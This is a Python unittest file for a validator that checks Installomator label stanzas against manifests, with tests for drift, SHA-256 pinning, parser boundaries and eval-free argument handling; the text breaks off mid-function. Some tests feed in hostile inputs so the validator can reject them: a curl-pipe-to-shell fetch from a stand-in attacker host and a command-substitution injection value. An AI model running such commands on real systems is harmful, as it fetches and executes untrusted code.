#!/usr/bin/env python3
import copy
import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from installomator_execution_contract import (
    _unsafe_version_resolver_shape,
    managed_execution_contract_errors,
    parse_installomator_labels,
)


def record(**overrides):
    value = {
        "label": "example", "name": "Example", "type": "dmg",
        "app_path": "/Applications/Example.app", "expected_team_id": "ABCDEFGHIJ",
        "download": {"method": "static", "url": "https://vendor.example/app.dmg"},
        "blocking_processes": ["Example"], "pinned_sha256": None,
        "patched": {"allowlisted": True, "mirror": False},
    }
    for key, item in overrides.items():
        value[key] = item
    return value


def engine(body):
    return "case $label in\nexample)\n" + body + "\n    ;;\nesac\n"


# PAT-1403: the real, unconditional (outside the label dispatch) PINNED_SHA256
# verification block from engine/Installomator.sh, trimmed to exactly what
# _engine_pins_downloaded_artifact_hash looks for. Tests that need the mirror
# downloadURL exemption to be GRANTED must use this; tests using plain
# engine(body) exercise the "engine check not confirmed" fail-closed path.
#
# PAT-1403 (round 2, Finding 1): the trailing `installFromDMG` line is
# required by the "runs before install" structural proof — without a
# reachable install-function call after the guard's closing `fi`, the
# function can no longer confirm the abort path precedes installation, so
# the block on its own (with nothing after it) would now be correctly
# treated as inconclusive rather than granted.
_PINNED_SHA256_CHECK_BLOCK = (
    'if [[ -n "${PINNED_SHA256:-}" ]]; then\n'
    '    _computed_sha256=$(shasum -a 256 "$archiveName" 2>/dev/null | cut -d \' \' -f 1)\n'
    '    if [[ "$_computed_sha256" != "$PINNED_SHA256" ]]; then\n'
    '        cleanupAndExit 64 "SHA-256 mismatch for ${label}" ERROR\n'
    '    fi\n'
    'fi\n'
    'installFromDMG\n'
)


def engine_with_pinned_hash_check(body):
    return engine(body) + _PINNED_SHA256_CHECK_BLOCK


class ContractTests(unittest.TestCase):
    def assert_error(self, rec, body, text, engine_text=None):
        text_to_use = engine(body) if engine_text is None else engine_text
        self.assertTrue(any(text in error for error in managed_execution_contract_errors([rec], text_to_use)))

    def test_matching_static_contract(self):
        body = '''    name="Example"
    type="dmg"
    downloadURL="https://vendor.example/app.dmg"
    expectedTeamID="ABCDEFGHIJ"'''
        self.assertEqual([], managed_execution_contract_errors([record()], engine(body)))

    def test_rejects_every_artifact_identity_drift(self):
        baseline = '''    name="Example"
    type="dmg"
    downloadURL="https://vendor.example/app.dmg"
    expectedTeamID="ABCDEFGHIJ"'''
        cases = (
            (baseline.replace('type="dmg"', 'type="pkg"'), "artifact type drift"),
            (baseline.replace("ABCDEFGHIJ", "ZZZZZZZZZZ"), "Team ID drift"),
            (baseline.replace("app.dmg", "other.dmg"), "download URL drift"),
            (baseline.replace('name="Example"', 'name="Other"'), "installed app path drift"),
            (baseline + '\n    blockingProcesses=( "Other" )', "blocking process drift"),
            (baseline + '\n    versionKey="CFBundleVersion"', "installed version key drift"),
            (baseline + '\n    packageID="com.vendor.pkg"', "unsupported execution field packageID"),
            (baseline + '\n    newlyInventedField="value"', "unclassified field newlyInventedField"),
        )
        for body, error in cases:
            with self.subTest(error=error):
                self.assert_error(record(), body, error)

    def test_rejects_dynamic_static_url_and_missing_stanza(self):
        body = '''    name="Example"
    type="dmg"
    downloadURL=$(curl https://vendor.example)
    expectedTeamID="ABCDEFGHIJ"'''
        self.assert_error(record(), body, "downloadURL must be one static quoted value")
        self.assertIn("no executable", managed_execution_contract_errors([record()], "case $label in\nesac\n")[0])

    def test_rejects_duplicate_managed_stanzas(self):
        body = '''    name="Example"
    type="dmg"
    downloadURL="https://vendor.example/app.dmg"
    expectedTeamID="ABCDEFGHIJ"'''
        duplicate = engine(body).replace("esac\n", "example)\n" + body + "\n    ;;\nesac\n")
        errors = managed_execution_contract_errors([record()], duplicate)
        self.assertTrue(any("2 Installomator stanzas" in error for error in errors), errors)

    def test_manifest_name_must_match_shell_name_unless_a_reviewed_exception(self):
        """PAT-1403 (round 2, Finding 2): the manifest's `name` field was
        never compared against the shell's `name=` assignment at all. An
        undocumented divergence (a label not listed in
        _DISPLAY_NAME_EXCEPTIONS) must be caught, while a real, reviewed
        divergence (zoom: manifest name "Zoom", shell name="zoom.us") must
        NOT be flagged — see
        test_current_repository_managed_labels_are_exhaustively_equivalent
        for that real-repo proof; this test isolates the artificial,
        undocumented case."""
        body = '''    name="Example"
    type="dmg"
    downloadURL="https://vendor.example/app.dmg"
    expectedTeamID="ABCDEFGHIJ"'''
        self.assert_error(record(name="Something Else"), body, "manifest name")

    def test_schema_invalid_managed_records_fail_without_crashing_contract(self):
        body = '''    name="Example"
    type="dmg"
    downloadURL="https://vendor.example/app.dmg"
    expectedTeamID="ABCDEFGHIJ"'''
        invalid_type = record(type="invented")
        self.assert_error(invalid_type, body, "unsupported artifact type")
        missing_download = record()
        del missing_download["download"]
        self.assert_error(missing_download, body, "no valid download object")
        self.assertTrue(any("missing valid label" in error for error in managed_execution_contract_errors(
            [{"patched": {"allowlisted": True}}], engine(body)
        )))

    def test_missing_download_url_field_fails_the_label_without_crashing_the_run(self):
        """PAT-1403 (round 2, Finding 7): a malformed record can be
        {"method": "static"} with no "url" key at all. download["url"]
        indexed directly raised an uncaught KeyError that crashed the ENTIRE
        validator run, not just this one label — contradicting the guarantee
        test_schema_invalid_managed_records_fail_without_crashing_contract
        establishes for other malformed shapes. Prove a missing url is now a
        clean per-label failure, not a crash that takes down every other
        label's validation with it."""
        body = '''    name="Example"
    type="dmg"
    downloadURL="https://vendor.example/app.dmg"
    expectedTeamID="ABCDEFGHIJ"'''
        missing_url = record(download={"method": "static"})
        errors = managed_execution_contract_errors([missing_url], engine(body))
        self.assertTrue(any("download URL drift" in error for error in errors), errors)

    def test_allowlist_predicate_requires_exact_boolean_true(self):
        malformed = record(patched={"allowlisted": "true", "mirror": False})
        self.assertEqual([], managed_execution_contract_errors([malformed], "case $label in\nesac\n"))

    def test_mirror_requires_exact_pinning_but_bypasses_shell_url_semantics(self):
        mirrored = record(
            download={"method": "resolved", "strategy": "sparkle-appcast", "source": "https://vendor.example/feed.xml"},
            pinned_sha256="a" * 64,
            patched={"allowlisted": True, "mirror": True, "mirror_url": "https://mirror.patched.im/example/1/example.dmg"},
        )
        body = '''    name="Example"
    type="dmg"
    downloadURL=$(arbitraryVendorResolver)
    expectedTeamID="ABCDEFGHIJ"'''
        # The downloadURL exemption is only granted when the engine text
        # itself contains the unconditional PINNED_SHA256 verification.
        self.assertEqual(
            [], managed_execution_contract_errors([mirrored], engine_with_pinned_hash_check(body)))
        missing_pin = copy.deepcopy(mirrored)
        missing_pin["pinned_sha256"] = None
        self.assert_error(
            missing_pin, body, "needs mirror_url and pinned_sha256",
            engine_text=engine_with_pinned_hash_check(body))

    def test_mirror_exemption_refused_without_confirmed_engine_hash_check(self):
        """PAT-1403 P2: a manifest declaring mirror_url + pinned_sha256 must
        NOT be enough on its own to skip the downloadURL comparison — the
        contract must also confirm the engine actually verifies the hash.
        Using plain engine(body) (no PINNED_SHA256 check block at all)
        proves the exemption fails closed rather than being granted on the
        manifest's say-so."""
        mirrored = record(
            download={"method": "resolved", "strategy": "sparkle-appcast", "source": "https://vendor.example/feed.xml"},
            pinned_sha256="a" * 64,
            patched={"allowlisted": True, "mirror": True, "mirror_url": "https://mirror.patched.im/example/1/example.dmg"},
        )
        body = '''    name="Example"
    type="dmg"
    downloadURL=$(arbitraryVendorResolver)
    expectedTeamID="ABCDEFGHIJ"'''
        self.assert_error(mirrored, body, "downloadURL exemption refused")

    def _mirrored_record_and_body(self):
        mirrored = record(
            download={"method": "resolved", "strategy": "sparkle-appcast", "source": "https://vendor.example/feed.xml"},
            pinned_sha256="a" * 64,
            patched={"allowlisted": True, "mirror": True, "mirror_url": "https://mirror.patched.im/example/1/example.dmg"},
        )
        body = '''    name="Example"
    type="dmg"
    downloadURL=$(arbitraryVendorResolver)
    expectedTeamID="ABCDEFGHIJ"'''
        return mirrored, body

    def test_mirror_exemption_refused_when_hash_check_wrapped_in_a_conditional(self):
        """PAT-1403 (round 2, Finding 1): presence of the four PINNED_SHA256
        markers anywhere after the label dispatch is not enough — the check
        must be UNCONDITIONAL. Wrap the exact real check block in a
        per-label conditional (the precise attack the finding describes:
        `if [[ $label != ghostty ]]; then ... fi` could exclude one label
        from the check while every textual marker still "passes") and prove
        the exemption is now refused rather than granted."""
        mirrored, body = self._mirrored_record_and_body()
        wrapped = (
            engine(body)
            + 'if [[ $label != "example" ]]; then\n'
            + _PINNED_SHA256_CHECK_BLOCK
            + 'fi\n'
        )
        self.assert_error(mirrored, body, "downloadURL exemption refused", engine_text=wrapped)

    def test_mirror_exemption_refused_when_hash_check_runs_after_install(self):
        """PAT-1403 (round 2, Finding 1): the abort path must be reachable
        BEFORE any install-function call — a hash mismatch that could only
        be detected after installation already ran would be too late.
        Reorder the exact real check block to come after installFromDMG and
        prove the exemption is refused."""
        mirrored, body = self._mirrored_record_and_body()
        after_install = engine(body) + 'installFromDMG\n' + _PINNED_SHA256_CHECK_BLOCK
        self.assert_error(mirrored, body, "downloadURL exemption refused", engine_text=after_install)

    def test_mirror_exemption_refused_when_hash_check_markers_are_reordered(self):
        """PAT-1403 (round 2, Finding 1): the four markers must occur in the
        order execution actually requires them (guard opens, archive is
        hashed, mismatch is checked, abort is reachable) — not just be
        present somewhere. Swap the mismatch-check/cleanupAndExit pair ahead
        of the shasum computation and prove the exemption is refused."""
        mirrored, body = self._mirrored_record_and_body()
        reordered = (
            engine(body)
            + 'if [[ -n "${PINNED_SHA256:-}" ]]; then\n'
            + '    if [[ "$_computed_sha256" != "$PINNED_SHA256" ]]; then\n'
            + '        cleanupAndExit 64 "SHA-256 mismatch for ${label}" ERROR\n'
            + '    fi\n'
            + '    _computed_sha256=$(shasum -a 256 "$archiveName" 2>/dev/null | cut -d \' \' -f 1)\n'
            + 'fi\n'
            + 'installFromDMG\n'
        )
        self.assert_error(mirrored, body, "downloadURL exemption refused", engine_text=reordered)

    def test_mirror_exemption_survives_comment_prose_with_nesting_like_tokens(self):
        """PAT-1403 (round 3, Finding 5): _engine_pins_downloaded_artifact_hash's
        _nesting_delta helper scans raw lines of the whole post-dispatch
        tail, including comment prose — and this round's own diff added
        dozens of lines of prose comments into exactly that scanned region.
        An ordinary comment containing incidental nesting-token-like text
        (e.g. "if this changes", "loop for each", "done; fi") must not shift
        the computed nesting depth away from 0 and silently flip the
        mirror-URL downloadURL exemption to refused. Insert such a comment
        immediately before the real, unconditional PINNED_SHA256 check block
        and prove the exemption is still correctly GRANTED."""
        mirrored, body = self._mirrored_record_and_body()
        engine_text = (
            engine(body)
            + '# fixed: if this ever changes, check the fi below\n'
            + '# loop for each label; done: fi\n'
            + '# (if needed) — this comment is not real shell nesting\n'
            + _PINNED_SHA256_CHECK_BLOCK
        )
        self.assertEqual([], managed_execution_contract_errors([mirrored], engine_text))

    def test_mirror_exempted_downloadurl_value_shape_checks(self):
        """PAT-1403 (round 6, Finding 1): the mirror_url/pinned_sha256
        exemption above only ever removed downloadURL from the manifest
        cross-check (see the `if not patched.get("mirror_url") or not
        record.get("pinned_sha256")` block) — nothing inspected the ASSIGNED
        VALUE, so a mirrored, allowlisted stanza could declare
        `downloadURL=$(curl attacker.example/x | sh)` and still be certified
        "within contract" purely because the exemption skipped looking at
        the field at all. Exactly the same class of hole round 4 already
        closed for _VERSION_RESOLVER_FIELDS. Prove (a) ghostty's real,
        currently-shipped downloadURL assignment (which legitimately uses
        `$appNewVersion` to resolve a version-templated URL) still passes
        the mirror-exemption path with no false positive, and (b) a
        synthetic mirrored/exempted label with a command-execution-
        disguised-as-a-URL downloadURL is REJECTED even though the mirror
        exemption would otherwise skip cross-checking it entirely."""
        root = Path(__file__).resolve().parents[1]
        engine_text = (root / "engine/Installomator.sh").read_text()
        shell_labels = parse_installomator_labels(engine_text)
        ghostty_download_url = shell_labels["ghostty"].values("downloadURL")
        self.assertEqual(1, len(ghostty_download_url), ghostty_download_url)
        self.assertIsNone(_unsafe_version_resolver_shape(ghostty_download_url[0]))

        ghostty_record = json.loads((root / "engine/labels/ghostty.json").read_text())
        self.assertEqual([], managed_execution_contract_errors([ghostty_record], engine_text))

        mirrored, _ = self._mirrored_record_and_body()
        malicious_body = '''    name="Example"
    type="dmg"
    downloadURL=$(curl -fs attacker.example/x | sh)
    expectedTeamID="ABCDEFGHIJ"'''
        self.assert_error(
            mirrored, malicious_body, "value shape is unsafe",
            engine_text=engine_with_pinned_hash_check(malicious_body))

    def test_mirror_exemption_refused_for_stanza_with_no_downloadurl_assignment(self):
        """PAT-1403 (round 7, Finding 2): the shape-check loop above only
        ever inspects downloadURL values it FINDS — if a mirror-exempted
        stanza has ZERO downloadURL assignments at all (no static one, no
        dynamic one, nothing), that loop is a no-op and the label was
        certified "within contract" with its artifact source completely
        unmodelled on both the manifest and shell side. Prove a stanza with
        no downloadURL assignment is now rejected even though every other
        mirror-exemption precondition (mirror_url, pinned_sha256, a
        confirmed unconditional engine-side PINNED_SHA256 check) is met, and
        that the real, currently-mirrored ghostty stanza — which does have
        one — still passes cleanly."""
        mirrored, _ = self._mirrored_record_and_body()
        no_download_url_body = '''    name="Example"
    type="dmg"
    expectedTeamID="ABCDEFGHIJ"'''
        self.assert_error(
            mirrored, no_download_url_body, "no downloadURL assignment at all",
            engine_text=engine_with_pinned_hash_check(no_download_url_body))

        root = Path(__file__).resolve().parents[1]
        engine_text = (root / "engine/Installomator.sh").read_text()
        shell_labels = parse_installomator_labels(engine_text)
        self.assertTrue(shell_labels["ghostty"].values("downloadURL"))
        ghostty_record = json.loads((root / "engine/labels/ghostty.json").read_text())
        self.assertEqual([], managed_execution_contract_errors([ghostty_record], engine_text))

    def test_nested_case_block_is_not_mistaken_for_a_new_label_boundary(self):
        """PAT-1403 P1: a nested `case ... in` / esac block used inside a
        label's own stanza (e.g. architecture branching) must not be
        mistaken for the start of the next top-level label arm. This uses
        unquoted, unindented nested arms (and an unindented nested esac) —
        the exact shape that defeated the old regex-only boundary detection
        — even though the real Installomator.sh's own arch blocks are
        quoted/indented (so they happen not to trigger the old bug today;
        the parser must not rely on that incidental formatting)."""
        body = '''    name="Example"
    type="pkg"
case $(arch) in
arm64)
    cpu_arch="aarch64"
;;
i386)
    cpu_arch="x64"
;;
esac
    downloadURL="https://vendor.example/${cpu_arch}/app.pkg"
    expectedTeamID="ABCDEFGHIJ"'''
        labels = parse_installomator_labels(engine(body))
        # No phantom label was created from a nested arm or the nested esac.
        self.assertNotIn("arm64", labels)
        self.assertNotIn("i386", labels)
        self.assertIn("example", labels)
        # Every real assignment after the nested block — including the
        # downloadURL that would previously have been silently attributed to
        # a phantom "arm64" label — is correctly attributed to "example".
        example = labels["example"]
        self.assertEqual(
            ('"https://vendor.example/${cpu_arch}/app.pkg"',), example.values("downloadURL"))
        self.assertEqual(('"ABCDEFGHIJ"',), example.values("expectedTeamID"))
        # The nested case block's mere presence is still recorded as an
        # unmodelled construct (P2) rather than silently ignored.
        self.assertTrue(example.shell_only)
        self.assert_error(record(type="pkg"), body, "shell-only construct")

    def test_single_line_multi_arm_case_pattern_is_a_stanza_boundary(self):
        """PAT-1403 (round 2, Finding 6): a single-line multi-arm pattern
        like `foo|bar)` (two-or-more label names joined by `|`, terminated
        by `)` all on ONE line — a real, currently-used shape in the engine,
        e.g. `captureone|captureonepro)`, `synergyeditor|
        synergyeditorbasketball)`) was not recognised as a stanza boundary
        at all, so its assignments were silently absorbed into the
        PRECEDING label's body — which could then spuriously fail an
        unrelated, innocent allowlisted label with "must assign name
        exactly once, found 2" or "shell-only construct" errors. Prove
        neither the preceding nor the following label's assignments are
        misattributed across such a boundary."""
        engine_text = (
            "case $label in\n"
            'example)\n'
            '    name="Example"\n'
            '    type="dmg"\n'
            '    downloadURL="https://vendor.example/app.dmg"\n'
            '    expectedTeamID="ABCDEFGHIJ"\n'
            '    ;;\n'
            'foo|bar)\n'
            '    name="FooOrBar"\n'
            '    type="pkg"\n'
            '    downloadURL="https://vendor.example/foobar.pkg"\n'
            '    expectedTeamID="ZZZZZZZZZZ"\n'
            '    ;;\n'
            'baz)\n'
            '    name="Baz"\n'
            '    type="zip"\n'
            '    downloadURL="https://vendor.example/baz.zip"\n'
            '    expectedTeamID="YYYYYYYYYY"\n'
            '    ;;\n'
            'esac\n'
        )
        labels = parse_installomator_labels(engine_text)
        # The multi-arm line is recognised as a boundary for BOTH names it
        # declares, each carrying only its own stanza's assignments.
        self.assertIn("foo", labels)
        self.assertIn("bar", labels)
        for multi_arm_label in ("foo", "bar"):
            self.assertEqual(('"FooOrBar"',), labels[multi_arm_label].values("name"))
            self.assertEqual(
                ('"https://vendor.example/foobar.pkg"',),
                labels[multi_arm_label].values("downloadURL"))
        # The PRECEDING label's assignments are not polluted by the
        # multi-arm stanza's fields.
        self.assertEqual(('"Example"',), labels["example"].values("name"))
        self.assertEqual(1, len(labels["example"].values("name")))
        # The FOLLOWING label's assignments are not misattributed either.
        self.assertEqual(('"Baz"',), labels["baz"].values("name"))
        # An allowlisted record for "example" (the label immediately
        # preceding the multi-arm boundary) certifies cleanly against this
        # exact engine text — proving its assignments were not absorbed into
        # "foo"/"bar" (which would otherwise manifest as a spurious "must
        # assign name exactly once, found 2" error on "example").
        self.assertEqual([], managed_execution_contract_errors([record()], engine_text))

    def test_default_catch_all_arm_is_a_stanza_boundary_not_a_phantom_label(self):
        """PAT-1403 (round 3, Finding 4): a bare `*)` default/catch-all arm
        (the fallback case in a real `case $label in ... esac` dispatch,
        e.g. `*) cleanupAndExit 1 "unknown label $label" ;;` right before
        the closing esac — see engine/fragments/main.sh) matched neither
        _ARM_RE nor _MULTI_ARM_RE, so it was not recognised as a stanza
        boundary at all: its body was silently absorbed into whatever the
        PRECEDING label's stanza was, the same misattribution class the
        nested-case fix and the single-line-multi-arm fix above already
        closed for other boundary shapes. Prove the preceding real label's
        stanza correctly ends at the `*)` boundary (not absorbing the
        catch-all's `cleanupAndExit` bare-command body as a shell-only
        construct of its own), and that no phantom "*" label is created."""
        engine_text = (
            "case $label in\n"
            'example)\n'
            '    name="Example"\n'
            '    type="dmg"\n'
            '    downloadURL="https://vendor.example/app.dmg"\n'
            '    expectedTeamID="ABCDEFGHIJ"\n'
            '    ;;\n'
            '*)\n'
            '    cleanupAndExit 1 "unknown label $label" ERROR\n'
            '    ;;\n'
            'esac\n'
        )
        labels = parse_installomator_labels(engine_text)
        # No phantom "*" label was created from the catch-all arm.
        self.assertNotIn("*", labels)
        # The preceding real label's stanza is not polluted by the
        # catch-all's body — it has no shell-only constructs of its own.
        self.assertEqual(('"Example"',), labels["example"].values("name"))
        self.assertEqual((), labels["example"].shell_only)
        # An allowlisted record for "example" certifies cleanly against this
        # exact engine text — proving the catch-all's bare `cleanupAndExit`
        # command was not absorbed into "example" (which would otherwise
        # manifest as a spurious "shell-only construct" error).
        self.assertEqual([], managed_execution_contract_errors([record()], engine_text))

    def test_non_assignment_shell_constructs_are_rejected(self):
        """PAT-1403 P2: a function definition (or any other non-assignment,
        non-comment shell construct) inside an allowlisted stanza must be
        rejected, not silently ignored — appCustomVersion overriding version
        resolution for a root-run installer is exactly the kind of
        execution-affecting shell-only construct this contract exists to
        catch."""
        body = '''    name="Example"
    type="dmg"
    downloadURL="https://vendor.example/app.dmg"
    expectedTeamID="ABCDEFGHIJ"
    appCustomVersion(){ /usr/bin/defaults read /Applications/Example.app/Contents/Info.plist CFBundleVersion }'''
        self.assert_error(record(), body, "shell-only construct")

    def test_firefox_and_googlechrome_style_printlog_warning_is_still_permitted(self):
        """The one real non-assignment construct already present in two
        currently-allowlisted labels (firefox, googlechrome) is a static,
        fully-literal printlog warning — it cannot affect artifact identity
        and must remain permitted so the P2 fix doesn't newly break real,
        already-allowlisted labels."""
        body = '''    name="Example"
    type="dmg"
    downloadURL="https://vendor.example/app.dmg"
    expectedTeamID="ABCDEFGHIJ"
    printlog "WARNING for ERROR: use examplepkg instead." REQ'''
        self.assertEqual([], managed_execution_contract_errors([record()], engine(body)))

    def test_blocking_processes_empty_and_none_semantics(self):
        """PAT-1403 P2: main.sh's `[[ -z $blockingProcesses ]]` fallback
        fires identically for an explicit empty array and for no assignment
        at all, substituting $name — so both must be modelled as [name], NOT
        []. The upstream `NONE` sentinel is the one spelling that is
        genuinely equivalent to an empty manifest list, because it is
        non-empty (so the -z fallback does not fire) but main.sh's own
        runtime check skips checkRunningProcesses for it specifically."""
        baseline = '''    name="Example"
    type="dmg"
    downloadURL="https://vendor.example/app.dmg"
    expectedTeamID="ABCDEFGHIJ"'''
        # No assignment at all: []-declaring manifest must NOT match.
        self.assert_error(record(blocking_processes=[]), baseline, "blocking process drift")
        # Explicit empty array: same runtime fallback as no assignment.
        self.assert_error(
            record(blocking_processes=[]), baseline + '\n    blockingProcesses=( )', "blocking process drift")
        self.assertEqual(
            [], managed_execution_contract_errors(
                [record(blocking_processes=["Example"])], engine(baseline + '\n    blockingProcesses=( )')))
        # NONE sentinel: genuinely equivalent to an empty manifest list.
        self.assertEqual(
            [], managed_execution_contract_errors(
                [record(blocking_processes=[])], engine(baseline + '\n    blockingProcesses=( NONE )')))
        self.assert_error(
            record(blocking_processes=["Example"]), baseline + '\n    blockingProcesses=( NONE )',
            "blocking process drift")

    def test_blocking_processes_fallback_matches_quoted_multi_word_name(self):
        """PAT-1403 (round 5, Finding 1): main.sh's fallback line used to be
        the UNQUOTED assignment `blockingProcesses=( $name )`, which
        word-split $name before building the array — for a label whose name
        contains a space, the real runtime array was two elements (`Google`,
        `Chrome`), never the single element `Google Chrome`, silently
        defeating the downstream `pgrep -x` check for every such label
        (found live against the real googlechrome.json/Installomator.sh
        pair). Fixed at the source: the fallback assignment is now quoted
        (`blockingProcesses=( "$name" )`), matching how the array is
        documented elsewhere in this file (one full process-name string per
        element, e.g. `( "App A" "App B" )`) and how real macOS process
        names actually look (Activity Monitor shows "Google Chrome" as one
        process). A manifest declaring the correct, unsplit name must be
        accepted against the fixed shell; a manifest declaring the old
        split-word shape must now be flagged as drift."""
        baseline = '''    name="Google Chrome"
    type="dmg"
    downloadURL="https://vendor.example/app.dmg"
    expectedTeamID="ABCDEFGHIJ"'''
        # No explicit blockingProcesses assignment: the $name fallback fires
        # and, per the now-quoted shell assignment, stays one element.
        self.assertEqual(
            [], managed_execution_contract_errors(
                [record(name="Google Chrome", app_path="/Applications/Google Chrome.app",
                        blocking_processes=["Google Chrome"])], engine(baseline)))
        self.assert_error(
            record(name="Google Chrome", app_path="/Applications/Google Chrome.app",
                   blocking_processes=["Google", "Chrome"]), baseline,
            "blocking process drift")
        # NOTE: _fallback_blocking_processes() models the $name fallback's
        # runtime shape as a fixed Python assumption (matching the real,
        # now-quoted engine source), not a dynamic re-parse of the fallback
        # assignment's quoting on every run -- the same "trusted assumption,
        # not re-verified per PR" shape as this file's NONE-sentinel and
        # empty-array handling elsewhere. A regression of the engine's
        # fallback line back to unquoted would NOT be caught by this
        # contract; it would need to be caught by a human noticing a diff to
        # engine/fragments/main.sh's or engine/Installomator.sh's fallback
        # block, same as any other silent-behavior-change risk in shell this
        # contract doesn't structurally parse.

    def test_current_repository_managed_labels_are_exhaustively_equivalent(self):
        root = Path(__file__).resolve().parents[1]
        records = [json.loads(path.read_text()) for path in sorted((root / "engine/labels").glob("*.json"))]
        errors = managed_execution_contract_errors(records, (root / "engine/Installomator.sh").read_text())
        self.assertEqual([], errors, "\n".join(errors))

    def test_runtime_argument_overrides_are_reapplied_without_eval(self):
        root = Path(__file__).resolve().parents[1]
        for relative in ("engine/Installomator.sh", "engine/fragments/main.sh"):
            text = (root / relative).read_text()
            self.assertNotIn("eval $argument", text, relative)
            self.assertIn('typeset -g "${argName}=${argValue}"', text, relative)
            self.assertIn('patchedAllowedArgNames[(Ie)$argName]', text, relative)
        # PAT-1403 (round 3, Finding 2): the checks above only ever inspected
        # the REAPPLY block (the second pass, after label dispatch). They
        # never looked at the FIRST argument-parsing pass — the one that
        # actually populates argumentsArray and defines
        # patchedAllowedArgNames in the first place, which this whole
        # security property depends on. A remaining root-level `eval` of
        # catalogue-derived CLI values in that first pass would have passed
        # this test suite completely unnoticed. Statically confirm the first
        # pass (engine/Installomator.sh only — engine/fragments/arguments.sh
        # is the stale, untouched, pre-hardening sibling, confirmed dead for
        # shipping purposes in round 4; see
        # test_fragments_arguments_sh_dead_for_shipping_invariants_hold
        # below for the CI-enforced proof of that claim) is equally
        # eval-free. See also
        # test_first_pass_never_evals_catalogue_derived_argument_values
        # below, which proves this dynamically by executing the real block.
        # NOTE: scoped to the extracted first-pass BLOCK, not the whole file
        # — the surrounding PAT-687 comment prose (just above the block)
        # legitimately mentions upstream's `eval $1` by name when explaining
        # what this code deliberately does NOT do, so a whole-file substring
        # check would false-positive on that comment.
        first_pass_text = self._first_pass_block()
        self.assertNotIn("eval $1", first_pass_text)
        self.assertNotIn('eval "$1"', first_pass_text)
        self.assertIn('typeset -g "${argName}=${argValue}"', first_pass_text)

    def _reapply_block(self):
        root = Path(__file__).resolve().parents[1]
        text = (root / "engine/Installomator.sh").read_text()
        return text.split("# >>> PATCHED_REAPPLY_ARGUMENTS_START", 1)[1].split(
            "# <<< PATCHED_REAPPLY_ARGUMENTS_END", 1
        )[0]

    def _first_pass_block(self):
        # PAT-1403 (round 3, Finding 1/2): the FIRST argument-parsing pass —
        # the one that populates argumentsArray and defines
        # patchedAllowedArgNames — bracketed with its own markers
        # (PATCHED_FIRST_PASS_ARGUMENTS_START/END) the same way the reapply
        # block already was, so it can be extracted and actually executed
        # here rather than only ever being read.
        root = Path(__file__).resolve().parents[1]
        text = (root / "engine/Installomator.sh").read_text()
        return text.split("# >>> PATCHED_FIRST_PASS_ARGUMENTS_START", 1)[1].split(
            "# <<< PATCHED_FIRST_PASS_ARGUMENTS_END", 1
        )[0]

    def _run_first_pass(self, args, env=None, trailer=""):
        # NOTE (PAT-1403): follows the same no-zsh-skip-guard convention as
        # _run_reapply_block below (pre-existing in this file). `args` is
        # passed through argv (not interpolated into the script string) so
        # no shell-quoting of the catalogue-derived value is needed.
        script = f'''printlog() {{ :; }}
cleanupAndExit() {{ echo "EXIT:$1:$2" >&2; exit "$1"; }}
label=$1
{self._first_pass_block()}
{trailer}
'''
        return subprocess.run(
            ["zsh", "-f", "-c", script, "installomator-test", *args],
            text=True,
            capture_output=True,
            env={**os.environ, **(env or {})},
            check=False,
        )

    def test_first_pass_zero_override_label_invocation_does_not_populate_arguments_array_or_trip_reapply_guard(self):
        """PAT-1403 (round 3, Finding 1, MOST SEVERE — INVESTIGATED, PROVEN
        SAFE): the review's premise was that upstream's first pass appends
        EVERY CLI argument to argumentsArray unconditionally, including the
        bare label name, which would make the round-1/2 exit-95 guard (a
        bare non-'=' token anywhere in argumentsArray) abort every single
        labeled endpoint install. Chain the REAL first-pass block and the
        REAL reapply block together (exactly as they run in production,
        back to back) against `Installomator.sh firefox` — a normal,
        zero-override label invocation — and prove: (1) argumentsArray ends
        up empty, and (2) the reapply block completes normally, never
        hitting exit 95 or exit 96."""
        result = subprocess.run(
            ["zsh", "-f", "-c", f'''printlog() {{ :; }}
cleanupAndExit() {{ echo "EXIT:$1:$2" >&2; exit "$1"; }}
label=$1
{self._first_pass_block()}
print -r -- "ARGCOUNT:${{#argumentsArray[@]}}"
{self._reapply_block()}
echo REAPPLY_BLOCK_COMPLETED
''', "installomator-test", "firefox"],
            text=True,
            capture_output=True,
            check=False,
        )
        self.assertEqual(0, result.returncode, result.stderr)
        self.assertIn("ARGCOUNT:0", result.stdout, result.stdout)
        self.assertNotIn("EXIT:95:", result.stderr)
        self.assertNotIn("EXIT:96:", result.stderr)
        self.assertIn("REAPPLY_BLOCK_COMPLETED", result.stdout)

    def test_first_pass_never_evals_catalogue_derived_argument_values(self):
        """PAT-1403 (round 3, Finding 2): execute (not just textually
        inspect) the real first argument-parsing pass with a catalogue-
        derived-shaped override value containing a command substitution,
        and prove it is assigned literally rather than evaluated as shell —
        the same property test_exact_runtime_reapply_block_treats_command_substitution_as_data
        already proves for the reapply block, extended to cover the pass
        that actually constructs argumentsArray and patchedAllowedArgNames
        in the first place."""
        with tempfile.TemporaryDirectory() as directory:
            marker = Path(directory) / "executed"
            result = self._run_first_pass(
                ["firefox", 'OVERRIDE_DOWNLOAD_URL=https://example.invalid/$(touch "$MARKER")'],
                env={"MARKER": str(marker)},
                trailer='print -r -- "$OVERRIDE_DOWNLOAD_URL"',
            )
            self.assertEqual(0, result.returncode, result.stderr)
            self.assertFalse(marker.exists(), "catalogue-derived argument value executed as shell")
            self.assertIn('$(touch "$MARKER")', result.stdout)

    def _run_reapply_block(self, setup, env=None, trailer=""):
        # NOTE (PAT-1403): every zsh-subprocess test in this file, including
        # the pre-existing one below, assumes a real `zsh` binary is present
        # unconditionally — there is no availability skip-guard anywhere in
        # this suite. That is pre-existing convention (this test follows it
        # rather than introducing new skip infrastructure inconsistent with
        # the rest of the file).
        #
        # PAT-1403 (round 3, P3, revisited and deliberately left as-is): this
        # file genuinely has no prior precedent for a zsh-availability guard
        # — it's new in this ticket — and the dependency on `zsh` being on
        # the runner image is real and currently unguarded. That is a
        # CI-environment provisioning concern (ensure `zsh` is on the runner
        # image), not a code-correctness issue with the tests themselves, so
        # it's tracked as a follow-up rather than fixed reactively here.
        #
        # PAT-1403 (execution-drift-gate follow-up): that follow-up landed —
        # .github/workflows/validate-labels.yml's `validate` job now installs
        # zsh via apt-get before this file runs, closing the gap these 8
        # tests hit as FileNotFoundError: 'zsh' on ubuntu-latest (PR #510).
        # Still no per-test skip-guard, and still deliberate: the workflow
        # step is now the single place that provisions the dependency for
        # the whole suite, consistent with the "pre-existing convention"
        # reasoning above rather than adding 8 redundant skipIf checks.
        script = f'''printlog() {{ :; }}
